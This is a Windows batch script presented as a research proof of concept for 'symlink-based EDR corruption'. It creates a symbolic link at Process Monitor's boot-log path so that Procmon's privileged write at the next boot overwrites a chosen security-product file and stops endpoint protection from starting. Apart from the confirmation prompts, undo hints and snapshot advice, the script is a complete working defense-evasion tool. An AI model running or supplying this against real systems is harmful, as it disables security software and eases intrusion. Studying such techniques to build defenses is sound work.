@echo off
setlocal EnableDelayedExpansion

:: ====================================================================
::  T7 - Symlink-based EDR Corruption  (research PoC)
::
::  Mechanism: create a symbolic link at Process Monitor's boot-log
::  path (C:\Windows\Procmon.pmb) pointing at a security-product file.
::  On the next boot, Procmon's privileged write follows the link and
::  overwrites the target file, so the product's protection component
::  fails to start.
::
::  Prerequisites (see README.md):
::    - Process Monitor configured with Options -> Enable Boot Logging
::    - the path of the security-product file to overwrite
::    - an elevated command prompt
::    - a VM snapshot taken BEFORE you reboot
::
::  SAFETY: nothing is damaged until the machine reboots. This script
::  does NOT reboot unless you pass --reboot.
::
::  Usage:
::    T7-Symlink-Corruption.bat "C:\Program Files\Vendor\edr.exe"
::    T7-Symlink-Corruption.bat "C:\Program Files\Vendor\edr.exe" --reboot
::
::  To undo before rebooting:  del "C:\Windows\Procmon.pmb"
:: ====================================================================

set "TARGET_FILE=%~1"
set "DO_REBOOT=%~2"
set "LINK_PATH=C:\Windows\Procmon.pmb"

echo [*] T7 - Symlink-based EDR Corruption
echo.

:: --- 1. Administrator check -----------------------------------------
net session >nul 2>&1
if not "%errorlevel%"=="0" (
    echo [ERROR] Run this script from an elevated command prompt.
    exit /b 1
)

:: --- 2. A real target path must be supplied -------------------------
if "%TARGET_FILE%"=="" goto :usage
if /i "%TARGET_FILE%"=="your_target_file_path_here" (
    echo [ERROR] The target path is still the placeholder value.
    echo.
    goto :usage
)

:: --- 3. Target must exist -------------------------------------------
if not exist "%TARGET_FILE%" (
    echo [ERROR] Target file not found: "%TARGET_FILE%"
    exit /b 1
)

:: --- 4. Refuse to clobber an existing link or file ------------------
if exist "%LINK_PATH%" (
    echo [ERROR] "%LINK_PATH%" already exists.
    echo         Remove it first:  del "%LINK_PATH%"
    exit /b 1
)

:: --- 5. Show the plan and require explicit confirmation -------------
echo [*] Plan
echo       link   : %LINK_PATH%
echo       target : %TARGET_FILE%
echo.
echo     On the next boot, Process Monitor will follow this link and
echo     OVERWRITE the target file. Take a VM snapshot before rebooting.
echo     To abort after the link is created:  del "%LINK_PATH%"
echo.
set "CONFIRM="
set /p "CONFIRM=Type YES to create the link: "
if /i not "%CONFIRM%"=="YES" (
    echo [*] Aborted. Nothing was changed.
    exit /b 1
)

:: --- 6. Create the link ---------------------------------------------
mklink "%LINK_PATH%" "%TARGET_FILE%"
if not "%errorlevel%"=="0" (
    echo [ERROR] mklink failed. Check the target path and your privileges.
    exit /b 1
)
echo [+] Symbolic link created.
echo.

:: --- 7. Reboot only when explicitly requested -----------------------
if /i "%DO_REBOOT%"=="--reboot" (
    echo [!] Rebooting in 5 seconds. Press Ctrl+C to cancel.
    shutdown /r /t 5
) else (
    echo [*] The link is in place. Reboot manually to trigger the corruption.
    echo [*] Undo with:  del "%LINK_PATH%"
)

exit /b 0

:: --------------------------------------------------------------------
:usage
echo Usage:
echo   %~nx0 "C:\path\to\edr\file.exe" [--reboot]
echo.
echo   First argument : the security-product file to overwrite.
echo   --reboot       : reboot automatically (only after snapshotting).
exit /b 1
